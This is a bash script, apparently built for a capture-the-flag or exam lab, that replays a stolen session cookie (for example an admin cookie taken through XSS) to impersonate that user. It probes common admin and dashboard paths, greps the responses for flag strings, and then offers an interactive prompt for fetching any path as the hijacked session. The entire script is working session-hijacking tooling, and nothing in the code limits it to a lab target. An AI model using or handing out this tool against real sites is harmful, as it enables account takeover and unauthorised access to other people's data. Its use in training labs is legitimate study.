#!/usr/bin/env bash
# ride-session — use a captured session cookie (e.g. an admin's, stolen via stored/blind
# XSS against an emulated user) to act as that user. Auto-probes common admin/objective
# pages and greps for the local flag, then drops you into a request loop. Local only.
#
# Usage:
#   ./ride-session.sh <base-url> '<cookie: name=value; name2=value2>'
#   ./ride-session.sh <base-url> '<cookie>' -c /some/path         # one-shot GET of a path
#
# Example:
#   ./ride-session.sh http://t/dev 'PHPSESSID=abc123'
set -uo pipefail
BASE="${1:?usage: ride-session.sh <base-url> '<cookie>' [-c path]}"; BASE="${BASE%/}"
COOKIE="${2:?need a cookie string}"
get(){ curl -s --max-time 15 -b "$COOKIE" "$BASE$1"; }

if [ "${3:-}" = "-c" ]; then get "${4:-/}"; exit 0; fi

echo "[*] riding session on $BASE"
echo "[*] probing common authed/objective pages:"
for p in / /admin.php /admin /admin/ /dashboard /dashboard.php /home.php /account /panel /users /subs.php /index.php; do
  code=$(curl -s --max-time 12 -b "$COOKIE" -o /tmp/rs.$$ -w '%{http_code}' "$BASE$p" 2>/dev/null)
  flag=$(grep -oiE 'OS\{[^}]*\}|local\.txt|[0-9a-f]{32}' /tmp/rs.$$ 2>/dev/null | head -1)
  [ "$code" = 200 ] && printf '    %-16s 200  %s\n' "$p" "${flag:+<= $flag}"
done; rm -f /tmp/rs.$$
echo "[*] interactive: type a path (e.g. /admin.php) to GET it as this session; 'q' to quit."
while true; do
  printf 'ride%s$ ' ""; IFS= read -r path || break
  [ "$path" = q ] && break; [ -z "$path" ] && continue
  case "$path" in /*) ;; *) path="/$path";; esac
  get "$path" | sed 's/<[^>]*>//g' | grep -vE '^\s*$' | head -40
done
